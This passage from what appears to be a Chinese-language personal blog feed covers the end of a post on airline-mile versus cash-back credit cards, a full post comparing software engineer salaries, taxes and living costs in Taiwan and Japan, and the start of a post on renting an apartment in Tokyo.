在美國的人光是開卡禮什麼的就可以拿幾萬哩了，而使用哩程開出來的票，運用各種轉機、中停與外站各種規則，也可以發揮比原本更多的價值。</p><p>但我的程度還不到那邊，所以這篇是給像我這種沒做功課的人看的，先不考慮這些活動。</p><p>從文章中實際查出來的各種數字，我們可以得知：</p><ol><li>無腦刷現金回饋卡，3% 回饋就很多了</li><li>假設刷的是 10 塊錢累積一哩程的信用卡，回饋至少 5%</li><li>短程經濟艙 3% - 4%</li><li>短程商務艙 5% - 7%</li><li>長程經濟艙 5% - 10%</li><li>長程商務艙 12% - 14%</li></ol><p>就這個結論看起來，刷哩程卡是會比較划算的。</p><p>但再次強調幾個重點：</p><p>第一，哩程卡重點在於累積，你要累積到一定數字（至少 20000 哩）以上才有意義。</p><p>第二，用哩程換商務艙以價錢來說是划算的，但會不會是一種不存在的需求？</p><p>舉例來說，你搭經濟艙就可以滿足了，根本不需要搭到商務艙，所以就算回饋高，其實整體看來還是虧的，你寧願把哩程拿去賣掉，也不想換商務艙。此時哩程的價值上限大概就是 5% 了。</p><p>第三，我前面在講刷卡累積哩程時，都是用 10 塊錢一哩來舉例，但這個數字在台灣基本上已經是最好的了，以滙豐旅人為例，要辦到年費 8000 台幣的無限卡才有這個回饋比例，而且這是海外消費才有。</p><p>那如果你的資格辦不到無限卡，或是都是國內消費居多，有可能就不是這個比例，而是 20 塊錢一哩，那這樣的話剛剛寫的回饋比例全都打對折，賣哩程的回饋變成 2.5%，跟現金卡差不了多少。</p><p>總而言之呢，如果你消費夠多（一年至少 20 萬台幣），也辦得到一張哩程回饋不錯的卡，又願意花一點時間去研究該怎麼開票，行程也比較彈性，想搭商務艙，那我覺得滿適合哩程卡的。</p><p>懶得研究哩程，消費又沒這麼多的話，無腦刷現金回饋卡會更有感覺，或是把時間拿去投資在信用卡的研究，CP 值也可能會更高。</p><p>如果看完這篇想要深入研究哩程的東西，台灣的話首選應該是這個：<a href="https://www.tripplus.cc/home">https://www.tripplus.cc/home</a> ，裡面的文章跟知識多到我看不完…</p><p>也可以用哩程當作關鍵字去搜一些人多的臉書社團，裡面會有各種開票的心得分享文。</p><p>最後的最後來講講我自己，之所以會想累積哩程，最大的原因是用現金買商務艙下不了手，所以才改用哩程的方式換，會讓我覺得划算了不少。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日本軟體工程師的薪水如何？到底值不值得去？</title>
      <link href="/2024/02/12/japan-software-engineer-salary/"/>
      <url>/2024/02/12/japan-software-engineer-salary/</url>
      
        <content type="html"><![CDATA[<p>前陣子被邀請去一個讀書會分享自己在日本的心得感想，以及日本軟體工程師產業的現況，就有順便整理了不少資料，想說那不如就寫一篇來分享。</p><p>在開始之前，要先跟各位讀者分享我覺得在讀這類型的文章前非常重要的事情。首先，只有經驗分享是沒有用的，沒有搭配上背景跟條件，就沒什麼參考價值。</p><p>舉個例子，如果有個人說：「到日本隨便都千萬日幣年薪啦，上次我隨便面面就兩千萬起跳，沒有年薪千萬千萬不要去」，背後的真實情況可能是怎麼樣？或許這個人台清交資工碩畢又是書卷獎，原本在台灣工作個兩三年以後年薪就 300 萬台幣以上了，以這個背景來說，他講的確實有道理，但也僅有相似背景的人適用。</p><p>但問題在於看到這個評論的人，不一定每個都是這個背景，更精確地說，其實絕大部分人都不是。那以其他背景的人來看，這則評論就顯得相當不合理。問題是或許有些人根本不知道，或沒意識到這件事，就會以為日本還真的隨隨便便就可以年薪千萬日幣。許多的評論都不會順勢揭露自己的背景，這就是我前面所講的，在不知道背景的狀況下，個人經驗的參考價值就變得偏低的理由。</p><p>其實也不光是國外，光台灣本身的狀況也是類似的，而且有時候類似背景的境遇也可能不同，畢竟背景只是決定薪水的一環，其他像是經驗、能力以及軟實力等等，都很難在一言兩語之內說明完畢。同樣是三年工作經驗，有的人可以領到百萬年薪，有的人可能只拿一半。</p><p>在談論薪水時，最理想的目標是：「不要高估，但也不要低估自己」。該如何定位自己，本身就不是件容易的事情，而該如何找到與自己背景類似的參考資料，這點就更難了。</p><p>就算是統計資料，根據背景不同或是國家差異，也可能會有誤差，而且正確的統計資料搭配錯誤的詮釋方式，也會得出不同的結果。不過，至少它的立論基礎會更穩固。</p><p>寫了這麼多，我想強調的只有三點：</p><ol><li>沒有提到個人背景的經驗分享，參考價值不高，可以先忽略</li><li>就算有提到，也只是僅供參考，還需要衡量到自己的狀況</li><li>統計數字相對來說應該會更有參考價值</li></ol><p>這篇會嘗試以統計資料以及可支配的所得的角度下手，並且附上一堆參考資料，讓有興趣的讀者們可以自己研究。</p><h2 id="台灣與日本的薪資所得比較"><a href="#台灣與日本的薪資所得比較" class="headerlink" title="台灣與日本的薪資所得比較"></a>台灣與日本的薪資所得比較</h2><p>根據<a href="https://twitter.com/eason9487/status/1699615935597085005">台灣行政院主計處的資料</a>，年薪與 PR 的對應表如下：</p><table><thead><tr><th>年薪（萬）</th><th>PR</th></tr></thead><tbody><tr><td>50</td><td>49.0</td></tr><tr><td>60</td><td>61.6</td></tr><tr><td>70</td><td>70.6</td></tr><tr><td>80</td><td>76.6</td></tr><tr><td>90</td><td>81.1</td></tr><tr><td>100</td><td>84.5</td></tr><tr><td>125</td><td>90.5</td></tr><tr><td>150</td><td>94.8</td></tr><tr><td>180</td><td>97.2</td></tr><tr><td>200</td><td>97.8</td></tr><tr><td>250</td><td>98.7</td></tr><tr><td>280</td><td>98.9</td></tr><tr><td>300</td><td>99.1</td></tr></tbody></table><p>如果以 PR 來換算的話，想達到各個 PR 需要的薪水如下：</p><table><thead><tr><th>PR</th><th>所需年薪（萬）</th></tr></thead><tbody><tr><td>50</td><td>50</td></tr><tr><td>60</td><td>60</td></tr><tr><td>70</td><td>70</td></tr><tr><td>80</td><td>90</td></tr><tr><td>85</td><td>100</td></tr><tr><td>90</td><td>125</td></tr><tr><td>95</td><td>150</td></tr><tr><td>99</td><td>280</td></tr></tbody></table><p>年收破百萬，PR 就 85 了，破 150 萬的話可以到 PR 95，想要成為全台薪資所得的前 1%，年薪需要 280 萬台幣。</p><p>話說這個統計資料只包含薪資所得，不包含投資等等，不過因為這篇只談薪資，所以應該沒什麼大礙。</p><p>日本的部分，根據<a href="https://www.cr.mufg.jp/mycard/beginner/23054/index.html">日本國稅廳 2021 年的統計資料</a>，可以得出以下表格：</p><table><thead><tr><th>年收</th><th>百分比</th><th>累積百分比</th></tr></thead><tbody><tr><td>100万円以下</td><td>8.1%</td><td>8.1%</td></tr><tr><td>100万円超 200万円以下</td><td>13.3%</td><td>21.4%</td></tr><tr><td>200万円超 300万円以下</td><td>14.8%</td><td>36.2%</td></tr><tr><td>300万円超 400万円以下</td><td>17.4%</td><td>53.6%</td></tr><tr><td>400万円超 500万円以下</td><td>15.0%</td><td>68.6%</td></tr><tr><td>500万円超 600万円以下</td><td>10.5%</td><td>79.1%</td></tr><tr><td>600万円超 700万円以下</td><td>6.7%</td><td>85.8%</td></tr><tr><td>700万円超 800万円以下</td><td>4.6%</td><td>90.4%</td></tr><tr><td>800万円超 900万円以下</td><td>2.9%</td><td>93.3%</td></tr><tr><td>900万円超 1,000万円以下</td><td>1.9%</td><td>95.2%</td></tr><tr><td>1,000万円超 1,500万円以下</td><td>3.5%</td><td>98.7%</td></tr><tr><td>1,500万円超 2,000万円以下</td><td>0.8%</td><td>99.5%</td></tr><tr><td>2,000万円超 2,500万円以下</td><td>0.3%</td><td>99.8%</td></tr><tr><td>2,500万円超</td><td>0.3%</td><td>100.0%</td></tr></tbody></table><p>我們可以跟剛剛台灣的對比一下，匯率以 0.22 做計算，括弧為日幣：</p><table><thead><tr><th>PR</th><th>台灣所需年薪</th><th>日本所需年薪</th></tr></thead><tbody><tr><td>50</td><td>50</td><td>88(400)</td></tr><tr><td>60</td><td>60</td><td>88-110(400~500)</td></tr><tr><td>70</td><td>70</td><td>110-132(500~600)</td></tr><tr><td>80</td><td>90</td><td>132(600)</td></tr><tr><td>85</td><td>100</td><td>154(700)</td></tr><tr><td>90</td><td>125</td><td>176(800)</td></tr><tr><td>95</td><td>150</td><td>220(1000)</td></tr><tr><td>99</td><td>280</td><td>330(1500)</td></tr></tbody></table><p>如果你想要到日本工作，又想維持同樣的「收入水準」，那可以參考上表。</p><p>從上表來看，同樣的 PR，日本的收入大概是台灣的 1.4 - 1.5 倍左右（PR 99 則是例外，只有 1.2 倍左右），但需要注意的是上表考慮的僅僅是收入本身，並不是可支配所得，沒有扣掉稅金跟保險等等。</p><h2 id="可支配所得的比較"><a href="#可支配所得的比較" class="headerlink" title="可支配所得的比較"></a>可支配所得的比較</h2><p>接著我們挑兩組比較常見的薪水，來比較一下相同 PR 底下的可支配所得，也就是收入扣掉各種稅金以及保險之後的費用。</p><p>第一組是台灣的 100 萬 vs 日本的 700 萬，直接用這個好用的網站幫我們計算：<a href="https://tw.talent.com/tax-calculator?salary=1000000&from=year&region=Taiwan">https://tw.talent.com/tax-calculator?salary=1000000&amp;from=year&amp;region=Taiwan</a></p><p>台灣的部分如下圖，已經有扣掉所得稅以及勞健保：</p><p><img src="/img/japan-software-engineer-salary/p1-tw-tax.png" alt="台灣可支配所得"></p><p>日本的部分一樣使用相同的<a href="https://jp.talent.com/tax-calculator?salary=7000000&from=year&region=Japan">網站</a>，結果如下圖：</p><p><img src="/img/japan-software-engineer-salary/p2-jp-tax.png" alt="日本可支配所得"></p><p>可以看到日本扣除的項目更多，700 萬日幣最後拿到的只有 520 萬，扣掉的項目包含：</p><ol><li>所得稅</li><li>國稅</li><li>健康保險</li><li>年金</li><li>失業保險</li></ol><p>不過這個網站的細項並沒有列得很精準，還有一個住民税沒有在細項裡面，但比對其他資料來源過後，發現應該是包含在所得稅的項目中。</p><p>我參考的其他網站如下，都有把住民稅算進去：</p><ol><li><a href="https://doda.jp/guide/oubo/tedori/">月給・年収の手取り計算の方法【早見表つき】</a>，寫到 700 萬實拿 525 - 595 萬</li><li><a href="https://studyfire.jp/?c=simulation/income_table">年収別　手取り金額一覧（年収100万円～年収1億円まで）</a>，寫到 700 萬實拿 524 萬</li><li><a href="https://www.musashi-corporation.com/wealthhack/annual-income-net-income">【早見表付】年収200万円～1億円の手取り｜計算式と簡易計算方法も解説</a>，寫到 700 萬實拿 530 萬，裡面有附上詳細的計算表格，大推</li></ol><p>這幾個資料來源跟剛剛使用的網站得出來的結果差不多，因此推測住民稅也是有算的，只是包含在所得稅裡面了，沒有獨立出來。</p><p>為了方便閱讀，我直接將幣值轉換為台幣了，數字也稍微做了一點處理，所以會有些許偏差。</p><table><thead><tr><th>國家</th><th>收入</th><th>稅金</th><th>稅金比例</th><th>可支配所得</th></tr></thead><tbody><tr><td>台灣</td><td>100 萬</td><td>11 萬</td><td>11%</td><td>89 萬</td></tr><tr><td>日本</td><td>154 萬</td><td>39.4 萬</td><td>25.6%</td><td>114.6 萬</td></tr></tbody></table><p>結論就是扣除稅金後，台灣是 89 萬台幣，日本則是 114.6 萬台幣。日本約為台灣的 1.28 倍。</p><p>接著再來看台灣的 150 萬 vs 日本的 1000 萬：</p><table><thead><tr><th>國家</th><th>收入</th><th>稅金</th><th>稅金比例</th><th>可支配所得</th></tr></thead><tbody><tr><td>台灣</td><td>150 萬</td><td>19.5 萬</td><td>13.1%</td><td>130.5 萬</td></tr><tr><td>日本</td><td>220 萬</td><td>58.3 萬</td><td>26.5%</td><td>161.7 萬</td></tr></tbody></table><p>台灣扣稅後剩下 130.5 萬，日本是 161.7 萬，日本約為台灣的 1.23 倍。</p><p>結論是如果收入的 PR 相同，雖然日本的薪水是台灣的 1.4 - 1.5 倍，但是扣稅後日本的可支配所得約為台灣的 1.25 倍左右（取個中間值）。</p><h2 id="生活所需開銷"><a href="#生活所需開銷" class="headerlink" title="生活所需開銷"></a>生活所需開銷</h2><p>因為每個人生活型態不一樣，我只算最大筆的房租加吃飯，吃飯全部都以外食計算，不考慮自己煮。生活型態都以一個人為例，不考慮家庭。租金的話也是憑自己體感居多，不一定準確（而且我沒在台北租過房，確實不知道行情）。水電網路等等的我也先排除了。</p><p>台灣的話在台北市租個 7、8 坪小套房，抓個 13k 好了，東京 23 區的話根據<a href="https://suumo.jp/chintai/soba/tokyo/">租房網站的資料</a>，1K 的租金可以抓個 9 萬日幣，房間大小也差不多，換算成台幣是 19.8k 左右。</p><p>吃飯的話每個人生活型態都不太一樣，而且根據公司地點也會有不同價位，我就憑我自己感覺大概抓一下，以自己的經驗為準。台灣的話我都吃某間健康便當，主菜雞胸肉加三樣配菜，120 元，日本的話其實飲食的選擇滿固定的，不像台灣有自助餐那種可以夾自己喜歡的，而且一般餐廳跟速食店的價差滿大，我比較常吃的是松屋、吉野家等等的平價速食店，下圖這樣漢堡排加青菜再加一碗湯，830 日幣，點牛丼的話會更便宜一點：</p><p><img src="/img/japan-software-engineer-salary/p3-dinner.jpeg" alt="日本晚餐"></p><p>因此台灣抓早餐 60 塊 + 午餐 120 + 晚餐 120，一天是 300 塊，一個月就是 9k。日本抓早餐 400 日幣 + 午餐 800 日幣 + 晚餐 800 日幣，一天是 2000 日幣，台幣約 440 塊，一個月是 13k。</p><p>因此只看租房跟吃飯，台北的生活費一個月是 22k，而東京是 32.8k，換算下來東京約為台北的 1.49 倍。</p><p>拿剛剛台灣的 100 萬跟日本的 700 萬來算，可以得到底下的表格：</p><table><thead><tr><th>國家</th><th>收入</th><th>稅後</th><th>基本花費</th><th>剩下的錢</th></tr></thead><tbody><tr><td>台灣</td><td>100 萬</td><td>89 萬</td><td>26.4 萬</td><td>62.6 萬</td></tr><tr><td>日本</td><td>154 萬</td><td>114.6 萬</td><td>39.3 萬</td><td>75.3 萬</td></tr></tbody></table><p>這個計算結果告訴我們，不包含其他娛樂費用的話，在台灣拿 100 萬收入的人如果去日本拿 700 萬日幣，每年可以多存個 12 萬左右。</p><p>若是拿 600 萬日幣的話，收入 132 萬，稅後 99.5 萬，扣掉基本花費 39.3 萬，剩下 60.2 萬，與台灣收入 100 萬可以存的錢是類似的。</p><p>這個結論與之前在 PTT 有一篇 alihue 大大寫的文章：<a href="https://www.ptt.cc/bbs/Soft_Job/M.1640353090.A.3A1.html">[心得] 日本薪水要除以十? 日本薪資換算分享</a>類似，文中的結論是：「在台北領 113 萬，跟在東京領 600~650 萬，可以存的錢是差不多的」，這篇在計算生活費的時候算得比較精準，還有包含飲食習慣以及雜費。</p><p>綜合稍早寫到的 PR 表以及 PTT 上的文章，可以得出底下表格（想要相同 PR 薪水的部分是比較隨意抓的，沒這麼精確）：</p><table><thead><tr><th>在台灣的薪水</th><th>想存相同的錢需要的薪水</th><th>想要相同 PR 需要的薪水</th></tr></thead><tbody><tr><td>113 萬</td><td>600 萬</td><td>700~800 萬</td></tr><tr><td>160 萬</td><td>800 萬</td><td>1000 萬</td></tr><tr><td>200 萬</td><td>1000 萬</td><td>1200 萬</td></tr><tr><td>255 萬</td><td>1200 萬</td><td>1500 萬</td></tr><tr><td>325 萬</td><td>1500 萬</td><td>1800 萬</td></tr></tbody></table><p>可以看出如果想要相同 PR 的話，是需要拿到更高的。</p><p>這個表格可以給想去日本工作的人一個參考，例如說你在台灣年薪 110 左右，如果你不想比台灣存的少，那去日本工作薪水至少要 600 萬日幣。若是想要有相同的收入 PR，那就至少需要 700 萬日幣，因此 600 - 800 萬日幣算是比較合理的範圍。</p><p>不過再次強調，上面的數字有著不少的前提以及限制，如果想要抓個更精確的數字，需要配合自身背景調整，細節也可以參考 leafwind 大大的：<a href="https://leafwind.tw/2020/10/15/jp-living-01/">日本工作篇：與台灣比較可支配收入</a>。</p><h2 id="從日本的角度看薪水"><a href="#從日本的角度看薪水" class="headerlink" title="從日本的角度看薪水"></a>從日本的角度看薪水</h2><p>剛剛講的其實都像是從台灣的角度出發，去看說如果自己到日本工作，該拿到怎樣的待遇，才不會比台灣存的少。但其實我們還需要注意在日本當地，到底薪水分佈是如何，畢竟我們想要的待遇是一回事，日本開的薪水又是另外一回事。</p><p>我自己會把日本軟體工程師依照薪水分成四大類，底下的薪水區間都是工作三五年以上的薪水，不考慮社會新鮮人（但 range 其實抓得滿寬，所以有些新鮮人也可能會拿到區間內的薪水）：</p><table><thead><tr><th>分類名稱</th><th>薪水區間</th><th>範例</th></tr></thead><tbody><tr><td>頂級外商</td><td>1500 萬以上</td><td>Google、Indeed、Amazon</td></tr><tr><td>其他英語為主的公司</td><td>700 萬 ~ 1500 萬</td><td>Mercari、PayPay、LINE、Rakuten</td></tr><tr><td>其他一般公司</td><td>500 萬 ~ 800 萬</td><td>CyberAgent、DeNA、Yahoo!</td></tr><tr><td>派遣公司</td><td>350 萬 ~ 700 萬</td><td>完全不熟</td></tr></tbody></table><p>這邊的區間是參考底下幾個資料來源得出的：</p><ol><li><a href="https://project-comp.com/detail/j100">Project comp</a></li><li><a href="https://opensalary.jp/en/roles/software-engineer">Open Salary</a></li><li><a href="https://japan-dev.com/">https://japan-dev.com/</a></li><li><a href="https://www.tokyodev.com/jobs/salary-data">https://www.tokyodev.com/jobs/salary-data</a></li><li><a href="https://japan-dev.com/blog/jp-software-developer-salaries-in-japan-the-ultimate-guide">日本で働くソフトウェアエンジニアの給与：東京で働く外国人エンジニアによる究極のガイド</a></li></ol><p>如果想要知道社會新鮮人的薪水範圍，可以參考 @tigercosmos 的這篇：<a href="https://tigercosmos.xyz/post/2022/06/japan/new-grad-find-swe-job-in-japan/">2022 海外新卒找日本東京軟體工程師工作經驗分享</a>。</p><p>第一個分類就是那些頂級外商公司，在這個區間的人就是開頭提到的「隨便都千萬日幣年薪」。</p><p>第二個分類是我周遭朋友最多人在的區間，畢竟列舉的那幾間公司有不少間在台灣找過人。這些公司基本上以英語溝通為主，不需要會日文，是不少台灣人選擇去日本工作的目標。有少數以英語為主的日本新創也會落在這個區間，新創的話可以去上面有貼的 japan dev 看，很多都會把薪水寫出來。</p><p>第三個分類我不太熟，但根據資料一些日本本土的公司大概是這個價碼，例如說 DeNA 以及 Yahoo! 等等。這些日本本土公司通常需要有日語能力，還有一些日本新創也在這區間內，可以用英文，但數量不多。</p><p>第四個分類我最不熟，但根據網路上的心得，應該是不太推薦去的一個區間，詳情可以參考底下幾篇：</p><ol><li><a href="https://kakuyomu.jp/works/1177354054890089747/episodes/1177354054890770261">台灣工程師看見的日本IT派遣黑暗面</a></li><li><a href="https://home.gamer.com.tw/artwork.php?sn=5593173">主題 日本IT業派遣及生活開銷分享</a></li><li><a href="https://forum.gamer.com.tw/C.php?bsn=60561&snA=23321">【心得】在日本工作6年的經驗分享</a></li><li><a href="https://www.ptt.cc/bbs/Tech_Job/M.1686918043.A.4D3.html">[心得] 在日本工作受不了，想回台灣</a></li></ol><p>把區間分出來以後，就很自然可以得知為什麼許多地方對於日本薪水的討論，會出現很兩極的現象，因為前兩個區間跟最後的區間，差異本來就很大，同樣是工作三五年，有些背景的人真的隨便找就千萬日幣，有些人卻領著 400 萬日幣。</p><p>在沒有揭露自身背景的前提之下，就會把四種區間混在一起聊，這就是我開頭所說的沒什麼參考價值的原因。</p><p>接著我們再回來看一下之前的這個表格：</p><table><thead><tr><th>在台灣的薪水</th><th>想存相同的錢需要的薪水</th><th>想要相同 PR 需要的薪水</th></tr></thead><tbody><tr><td>113 萬</td><td>600 萬</td><td>700~800 萬</td></tr><tr><td>160 萬</td><td>800 萬</td><td>1000 萬</td></tr><tr><td>200 萬</td><td>1000 萬</td><td>1200 萬</td></tr><tr><td>255 萬</td><td>1200 萬</td><td>1500 萬</td></tr><tr><td>325 萬</td><td>1500 萬</td><td>1800 萬</td></tr></tbody></table><p>可以發現這張表格上的薪水，基本上就是剛剛聊的第二個區間。以一個完全不會日文的人來說，選擇最多的其實就是這個區間了。而這個區間也是我最熟的區間，我有許多朋友都在前面提到的那幾間公司裡面。</p><h2 id="自身經驗分享"><a href="#自身經驗分享" class="headerlink" title="自身經驗分享"></a>自身經驗分享</h2><p>我的背景在剛剛已經揭露完畢了，我自己跟我大多數的朋友，都在以英文為主的這個區間，公司大概都是 Mercari、PayPay、LINE、Rakuten 這幾間，網路上寫的薪水範圍大約是 700 萬 - 1500 萬。</p><p>如果你的求職目標也是這個區間，那我自身的經驗談或許可以讓你作為參考。</p><p>以我自己的經驗而言，在日本能拿到的薪水，大約是剛剛那個表格的第一欄，也就是「想存相同的錢需要的薪水」，再附一次表格比較好看：</p><table><thead><tr><th>在台灣的薪水</th><th>想存相同的錢需要的薪水</th><th>想要相同 PR 需要的薪水</th></tr></thead><tbody><tr><td>113 萬</td><td>600 萬</td><td>700~800 萬</td></tr><tr><td>160 萬</td><td>800 萬</td><td>1000 萬</td></tr><tr><td>200 萬</td><td>1000 萬</td><td>1200 萬</td></tr><tr><td>255 萬</td><td>1200 萬</td><td>1500 萬</td></tr><tr><td>325 萬</td><td>1500 萬</td><td>1800 萬</td></tr></tbody></table><p>如果在台灣的能力拿個 120 萬年薪，在日本可以談到的大約會是 600 - 700 萬日幣。如果可以拿到 150 萬，大約是 800 - 900 萬日幣左右。</p><p>換句話說，你很有可能沒辦法維持相同的 PR 收入水準，你在台灣年收是 PR 85，來這邊可能掉到 PR 80。而且這畢竟只是參考，實際狀況因人而異，有些人或許台灣拿 150 萬，來日本卻只拿到 700 萬日幣，光看基本花費能存得就比台灣還少。</p><p>還不僅如此，雖然說這一欄叫做「想存相同的錢需要的薪水」，但前面有講說這只是粗估，實際上有更多因素需要考量，例如說家庭，有不少人都是帶著另一半來的，在日本的開銷就會更多，在物價較高的情形之下，差異就更大。或是稅收，台灣有些人可以報一堆撫養節稅，但在日本可能就不會報這麼多（考量到未來要申請永住之類的），還有交通啦以及娛樂等等的費用，這些剛剛都沒算。</p><p>結論是，我自己跟我身邊大部分的工程師朋友，來日本東京工作，可以存的錢都比以前少。是的，你沒有看錯，就是比較少。</p><p>很多人看到這裡，會想問的下一個問題就是…</p><h2 id="為什麼要來日本？"><a href="#為什麼要來日本？" class="headerlink" title="為什麼要來日本？"></a>為什麼要來日本？</h2><p>我自己聽過的理由有幾個：</p><ol><li>想換個生活環境看看</li><li>想出國體驗</li><li>未來想移民日本</li><li>想要第一線接觸日本文化（如動漫畫、偶像明星等等）</li></ol><p>通常會選擇來日本的人，都是對日本有愛，這個愛可能會體現在不同的領域。例如說有些人為了追星，所以想來日本；有些人則是為了生活，為了交通安全，因此選擇來一個<a href="https://tw.news.yahoo.com/%E6%97%A5%E5%AA%92%E7%9B%B4%E6%93%8A%E5%8F%B0%E7%81%A3%E8%A1%8C%E4%BA%BA%E5%9C%B0%E7%8D%84-%E7%9B%AE%E7%9D%B9%E8%BB%8A%E5%BE%9E%E8%A1%8C%E4%BA%BA%E9%96%93%E9%91%BD%E9%81%8E-%E4%BA%A4%E9%80%9A%E6%AD%BB%E4%BA%A1%E4%BA%BA%E5%9D%87%E9%AB%98%E6%97%A5%E6%9C%AC6%E5%80%8D-010507344.html">交通事故死亡率只有台灣的 20%</a> 的地方。</p><p>當然，日本也會有自己的缺點，並不是說日本生活就一定比台灣好。總之，我自己跟大多數的朋友，來日本的主因都不是薪水，因此就算在日本存得比台灣少，也會選擇來這裡。</p><p>雖然說很多人出國工作是為了薪水，但每個人看重的東西都不同。如果你只是為了錢，想要在日本賺得比台灣更多，存得也更多，那根據我前面一再提到的數據，日本很有可能不適合你。</p><p>比起日本，你或許可以考慮<a href="https://www.explainthis.io/zh-hant/career/software-engineer-salary-in-singapore">新加坡</a>，薪水比日本更高，税也比日本低，可以存到更多的錢。</p><p>但我覺得讀者們也可以從另外一個角度去想這件事，那就是存錢的目的是什麼？通常是為了更好的生活，那如果是為了生活，能存到的錢或許就只是其中一個點而已，還需要考慮更多長遠的事情，如買房等等，但因為這塊我不熟，所以就沒辦法談了。</p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>這篇利用官方的統計數字搭配非官方的薪水資訊以及個人的經驗，得出了一些數字，讓日後想來日本工作的讀者們參考。同時也附上了我比較熟悉的區間以及背景，讓讀者們參考時能夠有個依據。</p><p>再次強調，文章中的數字有些人是憑個人經驗或是四捨五入隨意抓的，沒有非常精確；再者，文中的日幣匯率是用 0.22 來算的，但現在已經掉到 0.21，差了 5%，所以如果你只是為了存錢回台灣花，那日本不適合你的理由又多了一個。</p><p>根據上面那些資料，這篇比較適合的讀者在台灣的年收大概是 100 萬 ~ 200 萬左右，比這個區間低或高都不太適合，比較適合去閱讀其他類似背景的文章。</p><p>最後回到標題，到底值不值得來日本工作？</p><p>如果只在意錢，出國工作是想要存更多錢，那日本很可能不適合你。但如果你有其他誘因，又沒這麼在意收入的話，日本或許會是不錯的選擇。</p>]]></content>
      
      
      <categories>
          
          <category> 日本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 日本東京租房心得分享</title>
      <link href="/2023/11/20/japan-tokyo-rental/"/>
      <url>/2023/11/20/japan-tokyo-rental/</url>
      
        <content type="html"><![CDATA[<p>在<a href="https://life.huli.tw/2023/10/29/japan-newbie-visa-address-phone-and-bank/">上一篇</a>有提到我把新手任務都跑得差不多了，但還剩下一個最麻煩的新手村大魔王，那就是租房了。</p><p>來日本一個多月以後，終於把租房以及房內的一些家具搞定了，也已經順利入住，並且有水電瓦斯以及馬斯洛需求理論的最底層：網路。趁著記憶猶新，是時候來寫一篇詳細講講租房的心得了。</p><p>對了，我之前在台灣的時候基本上都是住家裡，沒有在台灣租過房，所以連租房這件事情也是個初心者。</p><h2 id="第一關：定義找房條件"><a href="#第一關：定義找房條件" class="headerlink" title="第一關：定義找房條件"></a>第一關：定義找房條件</h2><p>既然要租房，那第一步就是想想自己想找怎樣的房子，而這之中又會牽涉更多更多細節，例如說預算、房型、地點以及可以接受的通勤時間等等。</p><h3 id="從通勤時間思考地點"><a href="#從通勤時間思考地點" class="headerlink" title="從通勤時間思考地點"></a>從通勤時間思考地點</h3><p>根據日經中文網在 2023 的報導，<a href="https://zh.cn.nikkei.com/politicsaeconomy/politicsasociety/51275-2023-02-03-05-00-10.html">日本人花在上班上學路上的平均時間為38分鐘</a>，而東京的平均時間則是 45 分鐘。交通費的話通常日本公司都會有全額補助，會贊助你買定期票的錢，所以倒是不用擔心。</p><p>我的辦公室在六本木那一帶，我希望能離公司比較近一點，會比較方便，能接受的通勤時間是 30 分鐘以內。</p><p>我們先來看一張東京都的地圖（來源：<a href="https://zh.m.wikipedia.org/wiki/%E4%B8%9C%E4%BA%AC">維基百科</a>）：</p><p><img src="/img/japan-tokyo-rental/p1.png" alt="東京地圖"></p><p>一般人對東京的認識大概是右邊紫色那一區，叫做東京 23 區，但實際上東京都其實滿大的，一直延伸到左邊去。六本木位於港區，在 23 區裡面中間偏下的位置。</p><p>如果想要通勤 30 分鐘以內，那大概就是中間那幾區可以考慮。決定了通勤時間以後，在決定地點時我其實還考慮了更細節的問題：電車擁擠程度。</p><p>之前就聽說過東京上班時間的電車很可怕，我自己來旅遊時也有碰過一遍，那是絕對不想再碰到的場合。於是當時我就上網找了一些電車擁擠度的文章做為參考，避免成為沙丁魚的一魚：</p><ol><li><a href="https://resources.realestate.co.jp/zh_TW/2019/08/21/%E6%9D%B1%E4%BA%AC%E6%BB%BF%E5%93%A1%E9%9B%BB%E8%BB%8A%E6%93%81%E6%93%A0%E7%A8%8B%E5%BA%A6%E8%AA%BF%E6%9F%A52018%E5%B9%B4%E5%BA%A6%E7%89%88/">東京滿員電車擁擠程度調查2018年度版｜住在這些電車路線，上班時間要做好被擠扁覺悟！</a></li><li><a href="https://tokyo.letsgojp.com/archives/479826/">擠過電車才算去過日本！「東京電車」最擁擠路線TOP5公開，你都搭過嗎？</a></li></ol><p>而通勤時間的長短其實與物理距離不一定成正比，主要還是看離車站的距離以及是否需要轉車。</p><p>舉例來說，底下這張圖是從日本紅十字會醫療中心到澀谷車站，直線距離沒有到很遠，但只能搭公車，Google 說要 19 分鐘。</p><p><img src="/img/japan-tokyo-rental/p2.png" alt="距離1"></p><p>而這張是從直線距離明顯遠很多的東京都庭園美術館到澀谷站，需要搭兩站的電車，但是卻只要 18 分鐘。</p><p><img src="/img/japan-tokyo-rental/p3.png" alt="距離2"></p><p>這就是我所說的通勤時間與物理距離不一定成正比，需要考量到各種細節。最佳解是找個不需要轉車可以直達的站，然後離這個車站又近，就能減少通勤時間，不過離車站近的房價可能也會比較高就是了，可以自己衡量。</p><p>另外再提醒一個小細節，雖然說上班通勤的交通費會補助，但是依然要考慮到下班後的通勤狀況，尤其是日本電車系統的轉換。</p><p>舉例來說，上圖左邊中間被卡掉的那個車站是「中目黑」，下方的那個車站是「目黑」，雖然這兩個車站的直線距離很近，但是從中目黑如果要到目黑，需要搭一站日比谷線到惠比壽，再從惠比壽搭一站山手線才能到目黑。</p><p>就跟台北捷運差不多，搭一站總是最貴的，從中目黑到惠比壽要 178 日幣，再轉山手線搭到目黑要 136 日幣，加起來是 314 日幣。</p><p>搭山手線半圈從澀谷到上野也才 200 日幣而已，可見這種「搭一站就要轉車」其實是對錢包很不利的行為，不過換個角度想的話就是：「既然如此就走路吧！身體健康精神好」，這樣想也是可以的。</p><p>地點決定了以後，就可以來定義更多找房條件了。</p><h3 id="更多找房條件細節"><a href="#更多找房條件細節" class="headerlink" title="更多找房條件細節"></a>更多找房條件細節</h3><p>最常見的就是這幾個：</p><ol><li>房型</li><li>大小</li><li>方位</li><li>房屋構造</li><li>建築年份</li></ol><p>房型的話日本有一套自己的術語，什麼 1K、1R、1LDK 之類的，這個上網隨便搜尋一下就會有更完整的說明，就不在這邊詳細講了，總之只要記住：</p><ol><li>K 是廚房 kitchen</li><li>L 是客廳 living</li><li>D 